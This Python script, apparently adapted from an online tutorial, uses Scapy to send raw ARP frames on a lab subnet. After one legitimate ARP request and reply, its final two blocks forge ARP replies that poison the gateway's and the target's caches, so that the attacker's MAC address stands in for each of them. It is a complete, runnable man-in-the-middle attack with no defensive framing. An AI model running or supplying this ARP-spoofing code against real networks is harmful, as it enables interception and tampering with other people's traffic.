#!/usr/bin/python
# https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
from scapy.all import *


#gateway    "10.0.20.1" 'AA:AA:AA:AA:AA:AA'     
#attacker   "10.0.20.2" 'AA:AA:AA:BB:BB:BB'
#target     "10.0.20.3" 'AA:AA:AA:CC:CC:CC'

gateway_ip =    "10.0.20.1"
gateway_mac =   '00:50:56:AA:AA:AA'     

attacker_ip =   "10.0.20.2"
attacker_mac =  '00:50:56:BB:BB:BB'

target_ip =     "10.0.20.3"
target_mac =    '00:50:56:CC:CC:CC'

bystander_ip =  "10.0.20.4"
bystander_mac = '00:50:56:DD:DD:DD'

eth_inteface = "Intel(R) Ethernet Connection (13) I219-LM"

broadcast_mac='FF:FF:FF:FF:FF:FF'
unknown_mac = "00:00:00:00:00:00"


### legit request
eth_frame = Ether(dst=broadcast_mac,src=bystander_mac, type=0x0806)
arp_packet = ARP(hwtype=1, ptype=0x0800, hwlen=6, plen=4, op=1, hwsrc=bystander_mac, psrc=bystander_ip, hwdst=unknown_mac, pdst=target_ip)
sendp(eth_frame/arp_packet, iface=eth_inteface)

### legit response
eth_frame = Ether(dst=bystander_mac,src=target_mac, type=0x0806)
arp_packet = ARP(hwtype=1, ptype=0x0800, hwlen=6, plen=4, op=2, hwsrc=target_mac, psrc=target_ip, hwdst=bystander_mac, pdst=bystander_ip)
sendp(eth_frame/arp_packet, iface=eth_inteface)

### spoof attacker as target to gateway
eth_frame = Ether(dst=gateway_mac,src=attacker_mac, type=0x0806)
arp_packet = ARP(hwtype=1, ptype=0x0800, hwlen=6, plen=4, op=2, hwsrc=attacker_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip)
sendp(eth_frame/arp_packet, iface=eth_inteface)

### spoof attacker as gw to target
eth_frame = Ether(dst=target_mac,src=attacker_mac, type=0x0806)
arp_packet = ARP(hwtype=1, ptype=0x0800, hwlen=6, plen=4, op=2, hwsrc=attacker_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip)
sendp(eth_frame/arp_packet, iface=eth_inteface)